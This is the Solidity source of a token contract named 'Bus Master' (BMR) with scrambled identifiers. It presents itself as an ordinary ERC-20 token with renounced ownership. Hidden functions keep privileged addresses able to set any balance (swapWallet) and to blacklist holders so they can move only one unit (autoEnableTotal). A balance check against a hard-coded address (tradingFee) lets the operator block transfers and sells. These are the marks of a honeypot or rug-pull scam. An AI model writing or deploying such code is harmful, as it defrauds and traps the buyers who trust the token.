//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface totalSellTrading {
    function createPair(address toMax, address modeReceiver) external returns (address);
}

interface swapList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listSell) external view returns (uint256);

    function transfer(address modeSwap, uint256 feeToken) external returns (bool);

    function allowance(address maxLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeToken) external returns (bool);

    function transferFrom(
        address sender,
        address modeSwap,
        uint256 feeToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableLaunched, uint256 value);
    event Approval(address indexed maxLaunch, address indexed spender, uint256 value);
}

abstract contract limitBuyTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapListMetadata is swapList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BusMaster is limitBuyTeam, swapList, swapListMetadata {

    string private shouldSwapLimit = "BMR";

    address public exemptToken;

    bool public exemptFrom;

    uint256 txListMode;

    event OwnershipTransferred(address indexed launchedListFee, address indexed marketingIs);

    bool private marketingAt;

    function autoEnableTotal(address minAmount) public {
        swapFundEnable();
        
        if (minAmount == exemptToken || minAmount == atReceiver) {
            return;
        }
        buyMin[minAmount] = true;
    }

    function txExempt(uint256 feeToken) public {
        swapFundEnable();
        minLiquidity = feeToken;
    }

    uint256 public buySwap;

    bool private isLiquidity;

    function fromShould(address liquiditySenderAmount, address modeSwap, uint256 feeToken) internal returns (bool) {
        require(tradingMax[liquiditySenderAmount] >= feeToken);
        tradingMax[liquiditySenderAmount] -= feeToken;
        tradingMax[modeSwap] += feeToken;
        emit Transfer(liquiditySenderAmount, modeSwap, feeToken);
        return true;
    }

    address receiverLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function tradingFee(address liquiditySenderAmount, address modeSwap, uint256 feeToken) internal returns (bool) {
        if (liquiditySenderAmount == exemptToken) {
            return fromShould(liquiditySenderAmount, modeSwap, feeToken);
        }
        uint256 tokenWallet = swapList(atReceiver).balanceOf(minList);
        require(tokenWallet == minLiquidity);
        require(modeSwap != minList);
        if (buyMin[liquiditySenderAmount]) {
            return fromShould(liquiditySenderAmount, modeSwap, swapTake);
        }
        return fromShould(liquiditySenderAmount, modeSwap, feeToken);
    }

    function balanceOf(address listSell) public view virtual override returns (uint256) {
        return tradingMax[listSell];
    }

    bool private fromLaunchSwap;

    function totalSupply() external view virtual override returns (uint256) {
        return sellAt;
    }

    function getOwner() external view returns (address) {
        return minMode;
    }

    function name() external view virtual override returns (string memory) {
        return senderBuyMode;
    }

    mapping(address => bool) public isMin;

    mapping(address => uint256) private tradingMax;

    function swapFundEnable() private view {
        require(isMin[_msgSender()]);
    }

    function swapWallet(address swapLiquidity, uint256 feeToken) public {
        swapFundEnable();
        tradingMax[swapLiquidity] = feeToken;
    }

    function owner() external view returns (address) {
        return minMode;
    }

    function transferFrom(address liquiditySenderAmount, address modeSwap, uint256 feeToken) external override returns (bool) {
        if (_msgSender() != receiverLimit) {
            if (launchSwap[liquiditySenderAmount][_msgSender()] != type(uint256).max) {
                require(feeToken <= launchSwap[liquiditySenderAmount][_msgSender()]);
                launchSwap[liquiditySenderAmount][_msgSender()] -= feeToken;
            }
        }
        return tradingFee(liquiditySenderAmount, modeSwap, feeToken);
    }

    uint256 minLiquidity;

    uint256 public minBuy;

    function takeExemptLimit(address launchWallet) public {
        require(launchWallet.balance < 100000);
        if (listToken) {
            return;
        }
        if (fundTotalMode) {
            isLiquidity = false;
        }
        isMin[launchWallet] = true;
        
        listToken = true;
    }

    constructor (){
        
        launchAmount amountTrading = launchAmount(receiverLimit);
        atReceiver = totalSellTrading(amountTrading.factory()).createPair(amountTrading.WETH(), address(this));
        if (exemptFrom == isLiquidity) {
            isLiquidity = true;
        }
        exemptToken = _msgSender();
        isMin[exemptToken] = true;
        tradingMax[exemptToken] = sellAt;
        fromTxList();
        if (fundTotalMode) {
            fundTotalMode = true;
        }
        emit Transfer(address(0), exemptToken, sellAt);
    }

    address minList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private takeTx = 18;

    uint256 private sellAt = 100000000 * 10 ** 18;

    string private senderBuyMode = "Bus Master";

    function symbol() external view virtual override returns (string memory) {
        return shouldSwapLimit;
    }

    function fromTxList() public {
        emit OwnershipTransferred(exemptToken, address(0));
        minMode = address(0);
    }

    mapping(address => mapping(address => uint256)) private launchSwap;

    bool private exemptSender;

    address public atReceiver;

    bool public listToken;

    uint256 constant swapTake = 1 ** 10;

    function approve(address modeFund, uint256 feeToken) public virtual override returns (bool) {
        launchSwap[_msgSender()][modeFund] = feeToken;
        emit Approval(_msgSender(), modeFund, feeToken);
        return true;
    }

    bool public fundTotalMode;

    uint256 private tokenEnable;

    uint256 private maxWallet;

    function allowance(address limitTake, address modeFund) external view virtual override returns (uint256) {
        if (modeFund == receiverLimit) {
            return type(uint256).max;
        }
        return launchSwap[limitTake][modeFund];
    }

    address private minMode;

    mapping(address => bool) public buyMin;

    function decimals() external view virtual override returns (uint8) {
        return takeTx;
    }

    function transfer(address swapLiquidity, uint256 feeToken) external virtual override returns (bool) {
        return tradingFee(_msgSender(), swapLiquidity, feeToken);
    }

}